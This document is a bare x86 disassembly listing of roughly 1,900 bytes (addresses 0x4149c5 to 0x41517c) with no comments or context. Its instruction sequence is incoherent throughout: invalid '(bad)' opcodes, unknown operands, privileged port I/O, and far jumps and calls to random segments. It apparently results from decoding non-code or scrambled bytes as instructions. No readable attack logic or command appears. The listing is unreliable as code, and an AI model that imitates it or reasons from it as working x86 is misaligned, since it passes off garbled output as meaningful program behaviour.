  4149c5:	sub    ch,BYTE PTR [esi]
  4149c7:	nop
  4149c8:	add    DWORD PTR [ebx-0x1c8f378e],eax
  4149ce:	cwde   
  4149cf:	push   eax
  4149d0:	fdivr  DWORD PTR [ecx+0x2fe8a11a]
  4149d6:	ds sub al,0x5f
  4149d9:	mov    ebp,0x1a64f8c4
  4149de:	xor    eax,DWORD PTR [ebx-0x1dbf7504]
  4149e4:	mov    ds:0x69757b9a,al
  4149e9:	pushf  
  4149ea:	and    DWORD PTR [ebp+0x7a],esi
  4149ed:	sbb    eax,0x578ea769
  4149f2:	aaa    
  4149f3:	loop   0x414a1f
  4149f5:	mov    eax,ds:0xc3af61f7
  4149fa:	mov    eax,ds:0x287c4e61
  4149ff:	push   cs
  414a00:	rcr    DWORD PTR [edi+eax*1],0xd4
  414a04:	inc    esi
  414a05:	mov    ah,0x6b
  414a07:	add    eax,0x57724b86
  414a0c:	outs   dx,BYTE PTR ds:[esi]
  414a0d:	mov    ds:0x11a960c7,al
  414a12:	xchg   edx,eax
  414a13:	ins    BYTE PTR es:[edi],dx
  414a14:	sahf   
  414a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a16:	jge    0x4149f1
  414a18:	dec    ebx
  414a19:	adc    dh,cl
  414a1b:	out    dx,al
  414a1c:	mov    dl,0x84
  414a1e:	inc    eax
  414a1f:	add    al,0x80
  414a21:	aas    
  414a22:	sbb    al,0x91
  414a24:	lea    ebp,[ecx]
  414a26:	arpl   WORD PTR [ecx+edx*1+0x2],ax
  414a2a:	and    al,0x8b
  414a2c:	pop    ebp
  414a2d:	mov    ah,0x45
  414a2f:	icebp  
  414a30:	push   0xf5ead176
  414a35:	jns    0x414a5f
  414a37:	mov    es,WORD PTR [edx-0x6d]
  414a3a:	scas   al,BYTE PTR es:[edi]
  414a3b:	jne    0x414a75
  414a3d:	inc    ebx
  414a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a3f:	pop    esi
  414a40:	aas    
  414a41:	or     al,0xd2
  414a43:	sub    DWORD PTR [esi],esp
  414a45:	dec    ebp
  414a46:	xchg   ebp,eax
  414a47:	aad    0xa9
  414a49:	pushw  0x72ae
  414a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a4e:	push   es
  414a4f:	pop    es
  414a50:	add    BYTE PTR [edx-0x69bcc795],ah
  414a56:	dec    edi
  414a57:	dec    esp
  414a58:	out    0xe2,eax
  414a5a:	sub    bl,BYTE PTR [ebx+0x54e43ad2]
  414a60:	and    dh,BYTE PTR [ebx]
  414a62:	and    eax,0xaa5bbe9b
  414a67:	adc    BYTE PTR [esi-0x402feb50],ch
  414a6d:	ret    
  414a6e:	ja     0x414a7a
  414a70:	retf   0x6587
  414a73:	std    
  414a74:	ret    0x1c12
  414a77:	cmp    DWORD PTR [esi],esp
  414a79:	rcr    BYTE PTR [esi],1
  414a7b:	dec    esp
  414a7c:	sbb    ch,BYTE PTR [edx-0x27]
  414a7f:	out    dx,eax
  414a80:	jnp    0x414af0
  414a82:	sub    BYTE PTR [eax-0x39],dl
  414a85:	mov    ebx,0xac57abc8
  414a8a:	sbb    ebp,DWORD PTR [edx]
  414a8c:	push   esp
  414a8d:	mov    dl,0xb5
  414a8f:	stc    
  414a90:	pop    esi
  414a91:	retf   0x55a3
  414a94:	add    eax,0x5a0a6d2a
  414a99:	xchg   ecx,eax
  414a9a:	xchg   esp,eax
  414a9b:	dec    eax
  414a9c:	inc    eax
  414a9d:	cmp    DWORD PTR [eax+ebp*4+0x23],0xf90c0085
  414aa5:	cmp    esi,DWORD PTR [ebp+0x59]
  414aa8:	mov    edi,DWORD PTR [ebp+0x1ee843f7]
  414aae:	xchg   dh,al
  414ab0:	add    cl,ch
  414ab2:	or     eax,0x113cee2c
  414ab7:	sahf   
  414ab8:	jmp    0xe7a2:0x6887f176
  414abf:	aam    0x43
  414ac1:	int3   
  414ac2:	les    ecx,FWORD PTR [ecx-0x2b]
  414ac5:	leave  
  414ac6:	mov    ecx,0x8448790e
  414acb:	fiadd  DWORD PTR [edi+0x11]
  414ace:	push   eax
  414acf:	mov    ch,0xc0
  414ad1:	jnp    0x414ad4
  414ad3:	es jae 0x414b49
  414ad6:	push   0x31
  414ad8:	leave  
  414ad9:	pop    esi
  414ada:	inc    bh
  414adc:	les    edi,FWORD PTR [edx-0x72]
  414adf:	(bad)  
  414ae0:	and    BYTE PTR [edi+ebx*8+0x3],bh
  414ae4:	and    al,0x7d
  414ae6:	sub    eax,DWORD PTR [esp+eax*2+0x48]
  414aea:	je     0x414ac4
  414aec:	xor    al,BYTE PTR ds:0x99328cb4
  414af2:	xor    eax,0x73d20349
  414af7:	push   esi
  414af8:	cs mov edx,0x63acc05d
  414afe:	cmp    eax,0xf046a4f
  414b03:	dec    ebp
  414b04:	pop    es
  414b05:	stos   DWORD PTR es:[edi],eax
  414b06:	out    0x77,al
  414b08:	adc    eax,0x73af1ccb
  414b0d:	xor    bh,0x7a
  414b10:	or     eax,0x5e3f40c4
  414b15:	inc    esi
  414b16:	push   ecx
  414b17:	push   0x4d
  414b19:	jb     0x414ada
  414b1b:	sub    eax,0xe0b5b3d0
  414b20:	in     al,0x46
  414b22:	mov    ds:0xd6742e8d,eax
  414b27:	and    al,0xd9
  414b29:	xor    cl,BYTE PTR [edi+ebp*2]
  414b2c:	pop    ss
  414b2d:	test   BYTE PTR [ecx-0x1c62a0ac],cl
  414b33:	adc    edi,0xa2c31006
  414b39:	mov    es,WORD PTR [eax-0x49f5e13]
  414b3f:	pop    eax
  414b40:	out    dx,eax
  414b41:	and    eax,0xade6bc32
  414b46:	or     BYTE PTR [edx+ebx*2-0x4e217fee],dl
  414b4d:	imul   edi,ebx,0xfffffffc
  414b50:	dec    edx
  414b51:	or     DWORD PTR [edi+0x3b91f7ad],ebx
  414b57:	repz in eax,0x26
  414b5a:	push   0xdd4835f1
  414b5f:	xor    al,0x74
  414b61:	sub    DWORD PTR [esi+0x58],0xffffffe3
  414b65:	into   
  414b66:	jo     0x414b49
  414b68:	bound  eax,QWORD PTR [esi-0x29]
  414b6b:	adc    ebx,esi
  414b6d:	adc    DWORD PTR [esi+0x52],0x19
  414b71:	xchg   edi,eax
  414b72:	fild   QWORD PTR [eax+0x15]
  414b75:	mov    DWORD PTR [edi+0x5e],0x46b64f18
  414b7c:	mov    bh,0x47
  414b7e:	call   0x16b:0x24969f7f
  414b85:	scas   al,BYTE PTR es:[edi]
  414b86:	fwait
  414b87:	test   BYTE PTR [ebp+0x2875ff22],bh
  414b8d:	dec    ecx
  414b8e:	sbb    DWORD PTR [esi+0x7b592a0b],esi
  414b94:	jno    0x414bf4
  414b96:	cdq    
  414b97:	xor    BYTE PTR [ebx],bl
  414b99:	xor    DWORD PTR [esi+0x47ab9636],ebp
  414b9f:	rcl    DWORD PTR [ebx+0x75502dfe],0xae
  414ba6:	dec    eax
  414ba7:	outs   dx,BYTE PTR ds:[esi]
  414ba8:	mov    esp,DWORD PTR [eax+0x6d]
  414bab:	fwait
  414bac:	jle    0x414c18
  414bae:	arpl   WORD PTR [edi-0x1654ec9e],bx
  414bb4:	stos   DWORD PTR es:[edi],eax
  414bb5:	pop    ebp
  414bb6:	sbb    BYTE PTR [edx+0x234d5d04],0x46
  414bbd:	ror    DWORD PTR [ebp+0x6c],1
  414bc0:	mov    bh,0xe9
  414bc2:	jecxz  0x414b78
  414bc4:	dec    esi
  414bc5:	and    eax,0x1a9680b2
  414bca:	pop    ebx
  414bcb:	test   DWORD PTR [edi-0x6f7c64d2],ebx
  414bd1:	sahf   
  414bd2:	xchg   edi,eax
  414bd3:	push   cs
  414bd4:	arpl   cx,ax
  414bd6:	test   DWORD PTR [esi+ebx*4],ebp
  414bd9:	arpl   WORD PTR [edi+0x40],si
  414bdc:	pusha  
  414bdd:	mov    ebp,esp
  414bdf:	sbb    DWORD PTR ds:0xb42e26b5,esi
  414be5:	in     al,0x52
  414be7:	inc    esi
  414be9:	aad    0x9c
  414beb:	push   ebp
  414bec:	test   BYTE PTR [eax-0x422a528e],al
  414bf2:	cmc    
  414bf3:	enter  0x863e,0x86
  414bf7:	call   0xfe3f:0xffb13b32
  414bfe:	jnp    0x414b9c
  414c00:	xor    eax,0xc44cd1fb
  414c05:	fisttp DWORD PTR [edi+ebp*4+0x6f]
  414c09:	sub    DWORD PTR [edx+0x4a4266b6],ecx
  414c0f:	push   ds
  414c10:	cli    
  414c11:	sub    bh,BYTE PTR ds:0x54bf1e27
  414c18:	pop    ss
  414c19:	push   edx
  414c1a:	in     eax,0x92
  414c1c:	test   eax,0xfe5fbf3e
  414c21:	jecxz  0x414c65
  414c23:	push   esp
  414c24:	and    BYTE PTR [esi+eiz*4+0x3b],dl
  414c28:	nop
  414c29:	rol    BYTE PTR [esi-0x7b86ca32],cl
  414c2f:	retf   0xa101
  414c32:	lods   eax,DWORD PTR ds:[esi]
  414c33:	adc    eax,0xd5e6c86c
  414c38:	ins    DWORD PTR es:[edi],dx
  414c39:	jbe    0x414c2e
  414c3b:	je     0x414c52
  414c3d:	cmp    DWORD PTR [edi],esi
  414c3f:	mov    ah,0xcb
  414c41:	or     BYTE PTR [ebp+0x16ecb03d],0x5
  414c48:	out    0x44,al
  414c4a:	sub    al,BYTE PTR [ecx]
  414c4c:	xor    BYTE PTR [ecx+0x5efe07a3],dl
  414c52:	cmp    eax,0x7be63192
  414c57:	pop    ebx
  414c58:	xor    eax,0xb8debc52
  414c5d:	int    0x44
  414c5f:	jl     0x414cd3
  414c61:	and    ebp,DWORD PTR [ecx-0x7695e593]
  414c67:	or     eax,DWORD PTR [ebp-0x2c]
  414c6a:	out    dx,eax
  414c6b:	ins    BYTE PTR es:[edi],dx
  414c6c:	pop    eax
  414c6d:	aas    
  414c6e:	arpl   WORD PTR [edx-0x3b],dx
  414c71:	adc    eax,DWORD PTR [ebp-0x30b24eff]
  414c77:	jno    0x414cc5
  414c79:	loope  0x414c69
  414c7b:	pop    esp
  414c7c:	pop    ebp
  414c7d:	sub    esp,DWORD PTR [esp+eax*4+0x7e189894]
  414c84:	lea    esp,[edi-0x17]
  414c87:	add    BYTE PTR [edi+0x6b80affa],0xeb
  414c8e:	mov    ds:0xcd70ca0a,eax
  414c93:	and    esp,edx
  414c95:	popf   
  414c96:	adc    BYTE PTR [esi-0x2ba9e1a7],bh
  414c9c:	cmp    esp,esp
  414c9e:	bnd jb 0x414c52
  414ca1:	dec    ebp
  414ca2:	pop    ss
  414ca3:	fild   WORD PTR [eax-0x7501836d]
  414ca9:	and    edi,DWORD PTR [edx]
  414cab:	push   ds
  414cac:	inc    eax
  414cad:	adc    BYTE PTR [esi+0x72],dh
  414cb0:	stos   BYTE PTR es:[edi],al
  414cb1:	sbb    BYTE PTR [edi-0x79a1fbcc],dl
  414cb7:	pop    esi
  414cb8:	or     bl,BYTE PTR [edi-0x35]
  414cbb:	sub    ch,bh
  414cbd:	out    dx,al
  414cbe:	push   ebx
  414cbf:	and    dh,BYTE PTR [edx+edx*1]
  414cc2:	fadd   DWORD PTR [edi]
  414cc4:	jo     0x414cd6
  414cc6:	fisub  WORD PTR [edi]
  414cc8:	stc    
  414cc9:	and    BYTE PTR [edi+ebx*1+0x149c6a82],al
  414cd0:	shl    BYTE PTR [esi],0x7d
  414cd3:	or     eax,0x3ff22556
  414cd8:	cmp    esp,edx
  414cda:	jg     0x414d3c
  414cdc:	mov    ds:0xc685e355,eax
  414ce1:	pop    edx
  414ce2:	dec    eax
  414ce3:	lahf   
  414ce4:	push   ebp
  414ce5:	les    esp,FWORD PTR [edi+0x34]
  414ce8:	ins    BYTE PTR es:[edi],dx
  414ce9:	test   BYTE PTR ds:0x78ebd5f2,cl
  414cef:	push   ebp
  414cf0:	jb     0x414d23
  414cf2:	rol    DWORD PTR [edx-0x2b80418b],1
  414cf8:	push   edx
  414cf9:	popf   
  414cfa:	scas   eax,DWORD PTR es:[edi]
  414cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cfc:	pusha  
  414cfd:	shl    DWORD PTR [eax-0x66],0x9f
  414d01:	dec    edi
  414d02:	jl     0x414cf7
  414d04:	sti    
  414d05:	xlat   BYTE PTR ds:[ebx]
  414d06:	ins    DWORD PTR es:[edi],dx
  414d07:	fst    QWORD PTR [esi-0x6e]
  414d0a:	inc    esp
  414d0b:	out    0x4a,eax
  414d0d:	arpl   WORD PTR [esi],bp
  414d0f:	mov    eax,ds:0x76e282f2
  414d14:	jl     0x414d7b
  414d16:	sbb    al,0x6c
  414d18:	sub    al,BYTE PTR [edi+0x6a520ab2]
  414d1e:	in     eax,0x54
  414d20:	mov    ch,0x78
  414d22:	jmp    0x5caf:0xec3e1fcb
  414d29:	(bad)  
  414d2b:	daa    
  414d2c:	ss cld 
  414d2e:	lods   al,BYTE PTR ds:[esi]
  414d2f:	adc    eax,0xad14f53c
  414d34:	jns    0x414ce5
  414d36:	xchg   ecx,eax
  414d37:	or     DWORD PTR [edx],ecx
  414d39:	test   al,0x3d
  414d3b:	(bad)  
  414d3c:	clc    
  414d3d:	iret   
  414d3e:	(bad)  
  414d3f:	jmp    DWORD PTR [ebx-0x10]
  414d42:	call   FWORD PTR [edx+0x6a1a3d32]
  414d48:	dec    edi
  414d49:	jl     0x414cfb
  414d4b:	push   edi
  414d4c:	jmp    0x7fb5:0x77260342
  414d53:	sbb    eax,0x1c02a87c
  414d58:	sbb    ah,BYTE PTR [eax-0x11]
  414d5b:	scas   al,BYTE PTR es:[edi]
  414d5c:	mov    cl,0x12
  414d5e:	leave  
  414d5f:	repz sub eax,0x52b97920
  414d65:	stos   BYTE PTR es:[edi],al
  414d66:	mov    esi,0xdc52e27d
  414d6b:	fs jno 0x414d64
  414d6e:	pop    esi
  414d6f:	ficomp WORD PTR [ebx+0x49]
  414d72:	and    ebp,esi
  414d74:	shl    ebx,1
  414d76:	repz fild DWORD PTR [esi-0x28]
  414d7b:	sub    DWORD PTR ds:0x196b470f,edi
  414d81:	xor    ah,BYTE PTR [eax]
  414d83:	sahf   
  414d84:	mov    cl,BYTE PTR [edx+0x3b]
  414d87:	retf   
  414d88:	pop    esi
  414d89:	xchg   DWORD PTR [ebx-0x6402116a],esp
  414d8f:	inc    edi
  414d90:	and    BYTE PTR [esi+0x78],ah
  414d93:	jge    0x414dcc
  414d95:	dec    edx
  414d96:	sub    DWORD PTR [ebp+0x3da3db7c],ecx
  414d9c:	mov    ds:0x4fa86192,eax
  414da1:	mov    cl,0xd1
  414da3:	adc    DWORD PTR [ebx+0x7102d1cc],edx
  414da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414daa:	out    0x1c,eax
  414dac:	jl     0x414d45
  414dae:	and    eax,0x98536544
  414db3:	int    0xb2
  414db5:	mov    cl,0x59
  414db7:	(bad)  
  414db9:	inc    ecx
  414dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dbc:	gs pushf 
  414dbe:	cs aas 
  414dc0:	mov    bh,BYTE PTR [ecx-0xe383f8]
  414dc6:	fidiv  WORD PTR [eax+ecx*1+0x36]
  414dca:	les    ebx,FWORD PTR [ebp+0x41]
  414dcd:	push   esp
  414dce:	inc    eax
  414dcf:	lods   al,BYTE PTR ds:[esi]
  414dd0:	push   ebp
  414dd1:	dec    eax
  414dd2:	cmc    
  414dd3:	dec    ecx
  414dd4:	pop    es
  414dd5:	or     esi,DWORD PTR [ecx+0x6c]
  414dd8:	adc    DWORD PTR [ecx-0x19181613],0xb87f1065
  414de2:	mov    ss,WORD PTR [edx]
  414de4:	pop    esp
  414de5:	add    eax,0x365a83ed
  414dea:	jge    0x414df6
  414dec:	hlt    
  414ded:	imul   ebx,DWORD PTR [ebx+0x2accf0d0],0x6e
  414df4:	dec    esi
  414df5:	jmp    FWORD PTR [ecx]
  414df7:	enter  0x4e95,0x7b
  414dfb:	popw   ss
  414dfd:	leave  
  414dfe:	js     0x414e34
  414e00:	and    al,0x9
  414e02:	inc    ebp
  414e03:	out    0xed,al
  414e05:	dec    edi
  414e06:	xchg   DWORD PTR [ecx+0x6a],ebp
  414e09:	pop    es
  414e0a:	(bad)  
  414e0c:	cmp    ebx,edx
  414e0e:	cmp    DWORD PTR [esi-0x42b58197],esi
  414e14:	rol    DWORD PTR ds:0x68b4384b,cl
  414e1a:	push   ebp
  414e1b:	jb     0x414dc5
  414e1d:	ins    DWORD PTR es:[edi],dx
  414e1e:	cli    
  414e1f:	cmp    ecx,esp
  414e21:	dec    esi
  414e22:	cmp    dl,0xdb
  414e25:	lods   eax,DWORD PTR ds:[esi]
  414e26:	xor    ebx,0xd415401e
  414e2c:	stos   BYTE PTR es:[edi],al
  414e2d:	sbb    al,0x5c
  414e2f:	test   WORD PTR [eax+eax*1-0x29ad0ee9],sp
  414e37:	int3   
  414e38:	jb     0x414dcb
  414e3a:	cwde   
  414e3b:	fld    TBYTE PTR [eax+ebp*4]
  414e3e:	or     DWORD PTR [edi+ecx*4-0x4e40152],ecx
  414e45:	hlt    
  414e46:	sub    eax,0x8eda4c78
  414e4b:	call   DWORD PTR [ebx]
  414e4d:	jp     0x414ea5
  414e4f:	shr    DWORD PTR [esi],0x49
  414e52:	ds cmp ecx,eax
  414e55:	dec    edi
  414e56:	rcr    BYTE PTR [esi],1
  414e58:	in     eax,dx
  414e59:	mov    bh,0xdf
  414e5b:	or     edx,DWORD PTR [edx]
  414e5d:	sbb    al,0x59
  414e5f:	xchg   DWORD PTR [eax],ebp
  414e61:	sub    edi,DWORD PTR ds:0xfb150fd9
  414e67:	mov    ch,0xa0
  414e69:	xchg   ecx,eax
  414e6a:	pusha  
  414e6b:	cli    
  414e6c:	ret    
  414e6d:	icebp  
  414e6e:	cwde   
  414e6f:	fld    QWORD PTR [ecx+0xbae36b2]
  414e75:	and    ecx,ebp
  414e77:	mov    esp,0xbf94b6c1
  414e7c:	ret    
  414e7d:	adc    eax,0x79559cf7
  414e82:	dec    edx
  414e83:	ja     0x414e5f
  414e85:	cli    
  414e86:	or     al,0x5d
  414e88:	fs xchg edi,eax
  414e8a:	push   ss
  414e8b:	(bad)  
  414e8c:	daa    
  414e8d:	mov    dh,0xa2
  414e8f:	xor    BYTE PTR [eax-0x55],al
  414e92:	push   0xffffffda
  414e94:	sbb    al,0x71
  414e96:	sar    bh,0x30
  414e99:	push   esp
  414e9a:	ss cmp ebx,edx
  414e9d:	dec    eax
  414e9e:	lock xor al,0xe0
  414ea1:	sbb    edx,DWORD PTR [ebx+0x51296786]
  414ea7:	mov    ch,0xf9
  414ea9:	push   ds
  414eaa:	xor    ecx,DWORD PTR [edx]
  414eac:	sub    al,0xd2
  414eae:	cwde   
  414eaf:	mov    edx,0x84cd76ac
  414eb4:	out    0xf9,eax
  414eb6:	scas   eax,DWORD PTR es:[edi]
  414eb7:	cwde   
  414eb8:	sbb    ecx,DWORD PTR [edi-0x72ff1ada]
  414ebe:	sub    DWORD PTR [esp+esi*8],ecx
  414ec1:	cmc    
  414ec2:	shl    ebp,1
  414ec4:	fcomp  QWORD PTR [edi]
  414ec6:	adc    dl,cl
  414ec8:	xor    eax,0xa6e1286d
  414ecd:	mov    ds:0x327ceecb,eax
  414ed2:	dec    DWORD PTR [esi+ecx*8-0x25]
  414ed6:	shr    dh,0x34
  414ed9:	lods   al,BYTE PTR ds:[esi]
  414eda:	sti    
  414edb:	ret    0xb6bd
  414ede:	dec    ecx
  414edf:	jno    0x414f0b
  414ee1:	addr16 pop ss
  414ee3:	pop    edx
  414ee4:	xlat   BYTE PTR ds:[ebx]
  414ee5:	fiadd  DWORD PTR [edx+0x1cb20da5]
  414eeb:	loop   0x414ec1
  414eed:	lock jns 0x414f21
  414ef0:	push   ebp
  414ef1:	push   ecx
  414ef2:	mov    DWORD PTR [ebp-0x39554e47],ebx
  414ef8:	aas    
  414ef9:	pushf  
  414efa:	xor    al,0x5c
  414efc:	mov    edi,0x7c0d110f
  414f01:	pusha  
  414f02:	loopne 0x414eb5
  414f04:	jmp    0xbb359e94
  414f09:	std    
  414f0a:	dec    ecx
  414f0b:	dec    esi
  414f0c:	push   ecx
  414f0d:	xchg   edx,eax
  414f0e:	add    esi,ecx
  414f10:	mov    fs,WORD PTR [eax-0x4e5d11ba]
  414f16:	test   eax,0x923c9eb6
  414f1b:	(bad)  
  414f1c:	cmp    ebp,DWORD PTR [edx+ecx*4-0x51]
  414f20:	bound  edx,QWORD PTR ds:0x56fd0c9a
  414f26:	in     eax,dx
  414f27:	xchg   edx,eax
  414f28:	mov    ss,WORD PTR [ecx]
  414f2a:	test   BYTE PTR [ebp+0x45],ch
  414f2d:	add    al,0x40
  414f2f:	adc    BYTE PTR [ebx+esi*2-0x1],al
  414f33:	inc    BYTE PTR [ebx+0xb]
  414f36:	sub    al,0xed
  414f38:	jp     0x414f18
  414f3a:	mov    bh,0xe5
  414f3c:	xchg   DWORD PTR [ecx],ecx
  414f3e:	cld    
  414f3f:	xchg   esi,eax
  414f40:	hlt    
  414f41:	arpl   WORD PTR [edx+0x1c812d13],bp
  414f47:	lahf   
  414f48:	std    
  414f49:	mov    ebp,0x3c2b165a
  414f4e:	jmp    0x414f8e
  414f50:	je     0x414f5b
  414f52:	add    edi,DWORD PTR [edx]
  414f54:	mov    ?,WORD PTR [ecx+0x7725a307]
  414f5a:	aas    
  414f5b:	pushf  
  414f5c:	in     al,dx
  414f5d:	pop    es
  414f5e:	xchg   esp,eax
  414f5f:	cmp    esi,DWORD PTR [di]
  414f62:	adc    DWORD PTR ds:0x4f7bfe27,ecx
  414f68:	loop   0x414ef5
  414f6a:	call   0xb9a6:0xff6a4877
  414f71:	jne    0x414fec
  414f73:	test   ah,al
  414f75:	shl    edx,1
  414f77:	push   ebx
  414f78:	mov    ebx,DWORD PTR [ebp-0x65c06255]
  414f7e:	pop    ss
  414f7f:	pop    esp
  414f80:	lahf   
  414f81:	ror    BYTE PTR [ebx-0x26f1ae2d],1
  414f87:	jle    0x414f51
  414f89:	pop    es
  414f8a:	daa    
  414f8b:	xchg   esp,eax
  414f8c:	cs mov dh,0xa5
  414f8f:	add    eax,DWORD PTR [edx-0x18e6fdf0]
  414f95:	sbb    eax,0xe2835310
  414f9a:	addr16 or eax,0x14dd59f4
  414fa0:	push   edi
  414fa1:	pop    edi
  414fa2:	jecxz  0x414fa4
  414fa4:	push   cs
  414fa5:	fdivr  QWORD PTR [eax]
  414fa7:	pop    edi
  414fa8:	pop    esi
  414fa9:	fld    DWORD PTR [ebx+0x4d]
  414fac:	cmp    BYTE PTR [edi+edx*2+0x5078a922],0x66
  414fb4:	add    al,0xb1
  414fb6:	mov    edi,0x21b6ae39
  414fbb:	xor    DWORD PTR [edx],0x507647dc
  414fc1:	fldcw  WORD PTR [eax+ecx*2]
  414fc4:	fld    TBYTE PTR [ebx]
  414fc6:	jo     0x414f5b
  414fc8:	fcom   QWORD PTR [esi+ebx*4-0x4df958a7]
  414fcf:	xchg   esi,eax
  414fd0:	stos   BYTE PTR es:[edi],al
  414fd1:	sub    bh,dh
  414fd3:	in     eax,0xf4
  414fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fd6:	mov    edx,0x5b94f72a
  414fdb:	mov    dh,0xa5
  414fdd:	inc    ebp
  414fde:	(bad)  
  414fdf:	cmp    eax,0x34bf269
  414fe4:	ins    DWORD PTR es:[edi],dx
  414fe5:	or     eax,DWORD PTR [edx-0x4efead98]
  414feb:	pop    edi
  414fec:	xchg   ebp,eax
  414fed:	add    al,0x98
  414fef:	push   ebx
  414ff0:	sub    ebx,DWORD PTR [edx+eax*8+0x57]
  414ff4:	(bad)  
  414ff5:	repnz and DWORD PTR [ebp-0x25cf92bc],ecx
  414ffc:	cli    
  414ffd:	push   ds
  414ffe:	cmp    ebp,esp
  415000:	add    ch,cl
  415002:	lds    esp,FWORD PTR [esi-0x15]
  415005:	sbb    eax,0x6c23f6b
  41500a:	xchg   esp,eax
  41500b:	xor    dh,BYTE PTR [ebp-0xc]
  41500e:	pushf  
  41500f:	pop    es
  415010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415011:	xor    DWORD PTR [esp+edx*4+0xe065c6c],edx
  415018:	sbb    DWORD PTR [eax],ebx
  41501a:	add    ebp,DWORD PTR [ebx-0x33625d6]
  415020:	adc    al,BYTE PTR [ecx+0x7f4f6f82]
  415026:	aas    
  415027:	add    DWORD PTR [esi-0x69],ebx
  41502a:	push   cs
  41502b:	jno    0x41501f
  41502d:	jnp    0x414fc0
  41502f:	repnz into 
  415031:	sbb    DWORD PTR [edi+0x132a13cb],ecx
  415037:	or     cl,BYTE PTR [esp+edx*1]
  41503a:	loop   0x415028
  41503c:	mov    al,0x5d
  41503e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41503f:	sbb    al,0x41
  415041:	jg     0x4150a1
  415043:	sbb    eax,0x6a446cdf
  415048:	out    dx,eax
  415049:	jo     0x4150b5
  41504b:	mov    dl,0x6a
  41504d:	addr16 pop ebx
  41504f:	mov    edi,0x1c2c239f
  415054:	aaa    
  415055:	(bad)  
  415057:	push   ebx
  415058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415059:	fs xchg ecx,eax
  41505b:	hlt    
  41505c:	outs   dx,DWORD PTR ds:[esi]
  41505d:	(bad)  
  41505e:	xchg   esi,eax
  41505f:	or     cl,BYTE PTR [esi+0x72cc5eda]
  415065:	(bad)  
  415066:	xchg   esi,eax
  415067:	inc    eax
  415068:	fcmovu st,st(5)
  41506a:	fild   DWORD PTR [ebx+edi*8-0x19]
  41506e:	dec    ebx
  41506f:	and    al,0xa0
  415071:	push   ebx
  415072:	ret    
  415073:	pop    es
  415074:	inc    ecx
  415075:	int3   
  415076:	dec    edx
  415077:	sub    cl,dh
  415079:	scas   eax,DWORD PTR es:[edi]
  41507a:	test   al,0x7a
  41507c:	pop    ebp
  41507d:	mov    esi,ebx
  41507f:	js     0x4150a4
  415081:	push   edx
  415082:	push   ebp
  415083:	adc    al,0xd7
  415085:	fsub   DWORD PTR [esi-0x6a74a5d]
  41508b:	jge    0x4150cb
  41508d:	mov    WORD PTR [esi-0x19ac2dfb],?
  415093:	push   edi
  415094:	jb     0x4150e5
  415096:	and    eax,0xf6cd4344
  41509b:	shl    esi,0xe4
  41509e:	pop    ecx
  41509f:	fiadd  WORD PTR [edx]
  4150a1:	pop    ebp
  4150a2:	dec    edx
  4150a3:	inc    ebp
  4150a4:	fcmovb st,st(0)
  4150a6:	inc    edx
  4150a7:	and    bl,BYTE PTR [eax-0x20]
  4150aa:	retf   
  4150ab:	cdq    
  4150ac:	in     eax,0x3b
  4150ae:	cmp    eax,0xb5de6af5
  4150b3:	hlt    
  4150b4:	cli    
  4150b5:	lods   al,BYTE PTR ds:[esi]
  4150b6:	(bad)  
  4150b7:	xchg   edi,eax
  4150b8:	cmp    eax,0x96594719
  4150bd:	dec    ecx
  4150be:	xor    eax,0xda4b1b25
  4150c3:	adc    bl,BYTE PTR [edi+0x71]
  4150c6:	psraw  mm6,QWORD PTR [esi+0x7a]
  4150ca:	rol    DWORD PTR [esi-0x22],0x75
  4150ce:	ja     0x4150ee
  4150d0:	or     al,0x6d
  4150d2:	fwait
  4150d3:	les    ebx,FWORD PTR [edx]
  4150d5:	push   ebx
  4150d6:	xchg   BYTE PTR [ebp+0x79],dl
  4150d9:	push   0x50
  4150db:	scas   al,BYTE PTR es:[edi]
  4150dc:	pusha  
  4150dd:	stos   DWORD PTR es:[edi],eax
  4150de:	xchg   edi,eax
  4150df:	cmp    eax,DWORD PTR ds:0xd4e49431
  4150e5:	ss jns 0x4150c2
  4150e8:	pop    esp
  4150e9:	ja     0x4150f4
  4150eb:	add    esi,DWORD PTR [esi]
  4150ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150ee:	mov    eax,0x320805d1
  4150f3:	jo     0x415145
  4150f5:	lea    edi,[edx+0x4f]
  4150f8:	in     eax,dx
  4150f9:	jno    0x4150b0
  4150fb:	ins    DWORD PTR es:[edi],dx
  4150fc:	xor    edx,DWORD PTR [esi]
  4150fe:	jmp    0xb103:0xed5d1ccd
  415105:	add    ebx,0xa857d5ed
  41510b:	ret    
  41510c:	xchg   ebp,eax
  41510d:	pop    esi
  41510e:	mov    ecx,0x8c5251b2
  415113:	cwde   
  415114:	retf   
  415115:	xor    BYTE PTR [edi],ch
  415117:	lock adc al,0x69
  41511a:	into   
  41511b:	mov    esi,0x45033f7b
  415120:	xchg   edi,eax
  415121:	ror    BYTE PTR [esp],1
  415124:	inc    esp
  415125:	jmp    0x74a4:0x3488b28b
  41512c:	call   DWORD PTR [ebx+edx*2+0x4]
  415130:	(bad)  
  415131:	pop    edi
  415132:	push   ss
  415133:	lds    edi,FWORD PTR ds:[eax+0x2b9b46fb]
  41513a:	jmp    0xe882:0xcafe9970
  415141:	adc    esp,0x6f
  415144:	leave  
  415145:	rcl    BYTE PTR [esi+0x72],0xca
  415149:	jbe    0x4150fd
  41514b:	call   0x25fc:0xc422a300
  415152:	jno    0x4150e0
  415154:	jl     0x4150f9
  415156:	ficomp DWORD PTR [ebp+0x786c369f]
  41515c:	pop    esi
  41515d:	jmp    0x8d3a:0x3a47c621
  415164:	rol    DWORD PTR [ebx+0x78],1
  415167:	jmp    0xae93:0xa542b03a
  41516e:	outs   dx,DWORD PTR ds:[esi]
  41516f:	out    0x7b,al
  415171:	maxps  xmm2,XMMWORD PTR [edi+0x17]
  415175:	pop    esp
  415176:	xchg   esp,eax
  415177:	lea    edi,[ebp-0x62]
  41517a:	lock cld 
  41517c:	adc    eax,esp
